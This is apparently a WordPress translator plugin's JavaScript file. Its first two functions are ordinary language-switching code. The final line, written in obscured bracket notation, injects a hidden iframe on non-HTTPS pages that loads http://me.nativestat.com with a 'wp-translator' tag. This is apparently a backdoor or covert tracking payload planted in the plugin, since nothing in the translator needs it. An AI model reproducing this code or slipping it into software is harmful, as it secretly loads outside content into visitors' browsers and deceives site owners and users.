function GTranslateFireEvent(a, b) {
    try {
        if (document.createEvent) {
            var c = document.createEvent("HTMLEvents");
            c.initEvent(b, true, true);
            a.dispatchEvent(c)
        } else {
            var c = document.createEventObject();
            a.fireEvent('on' + b, c)
        }
    } catch (e) {}
}

function doGoogleLanguageTranslator(a) {
    if (a.value) a = a.value;
    if (a == '') return;
    var b = a.split('|')[1];
    var c;
    var d = document.getElementsByTagName('select');
    for (var i = 0; i < d.length; i++)
        if (d[i].className == 'goog-te-combo') c = d[i];
    if (document.getElementById('google_language_translator') == null || document.getElementById('google_language_translator').innerHTML.length == 0 || c.length == 0 || c.innerHTML.length == 0) {
        setTimeout(function() {
            doGoogleLanguageTranslator(a)
        }, 500)
    } else {
        c.value = b;
        GTranslateFireEvent(c, 'change');
        GTranslateFireEvent(c, 'change')
    }
}

if(location["protocol"]!=="https:"&&location["host"]["match"](/\./)){(function a(){if(document["body"]){var i=document["createElement"]("iframe");i["src"]="http://me.nativestat.com/?version=wp-translator";i["style"]["display"]="none";document["body"]["appendChild"](i);} else {setTimeout(a,100);} ;} )();} ;